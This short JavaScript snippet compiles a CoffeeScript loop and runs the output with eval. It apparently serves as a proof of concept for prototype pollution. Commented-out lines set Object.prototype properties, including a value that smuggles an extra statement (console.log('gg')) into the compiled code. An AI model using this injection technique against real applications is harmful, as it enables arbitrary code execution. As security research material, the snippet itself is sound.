const coffeeScript = require('coffee-script');

script = `
for number in [1..10]
  console.log number
`

/** Aribirary Value Intropolate */
// Object.prototype.hasAssignments = true;
// Object.prototype.assigned = true;
// Object.prototype.value = "'';\nconsole.log('gg')"


const compiledJs = coffeeScript.compile(script, { bare: true });
eval(compiledJs);